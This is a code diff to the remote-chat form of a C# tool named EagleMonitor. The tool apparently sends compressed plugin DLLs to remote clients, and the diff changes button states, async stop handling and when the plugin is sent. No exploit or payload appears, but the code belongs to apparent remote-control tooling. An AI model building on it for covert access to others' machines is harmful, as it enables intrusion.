@@ -5,6 +5,7 @@ using PacketLib.Packet;
 using System;
 using System.Drawing;
 using System.IO;
+using System.Threading.Tasks;
 using System.Windows.Forms;
 
 /* 
@@ -40,6 +41,7 @@ namespace EagleMonitor.Forms
             if (!hasAlreadyConnected)
             {
                 startGuna2Button.Enabled = false;
+                stopGuna2Button.Enabled = true;
                 RemoteChatPacket chatPacket = new RemoteChatPacket(PacketType.CHAT_ON);
                 chatPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Chat.dll"), 1);
                 chatPacket.baseIp = this.baseIp;
@@ -47,16 +49,17 @@ namespace EagleMonitor.Forms
             }
         }
 
-        private void stopGuna2Button_Click(object sender, EventArgs e)
+        private async void stopGuna2Button_Click(object sender, EventArgs e)
         {
             if (hasAlreadyConnected)
             {
                 RemoteChatPacket chatPacket = new RemoteChatPacket(PacketType.CHAT_OFF);
-                chatPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Chat.dll"), 1);
-                chatPacket.baseIp = this.baseIp;
-                clientHandler.SendPacket(chatPacket);
+                chatPacket.baseIp = baseIp;
+                await Task.Run(() => clientHandler.SendPacket(chatPacket));
+                await Task.Run(() => clientHandler.Dispose());
                 hasAlreadyConnected = false;
                 startGuna2Button.Enabled = true;
+                stopGuna2Button.Enabled = false;
             }
         }
 
@@ -65,7 +68,6 @@ namespace EagleMonitor.Forms
             if (hasAlreadyConnected) 
             {
                 RemoteChatPacket chatPacket = new RemoteChatPacket(PacketType.CHAT_ON);
-                chatPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Chat.dll"), 1);
                 chatPacket.msg = "Admin : " + messageGuna2TextBox.Text + "\n";
                 chatPacket.baseIp = baseIp;
                 this.messageRichTextBox.SelectionColor = Color.FromArgb(197, 66, 245);
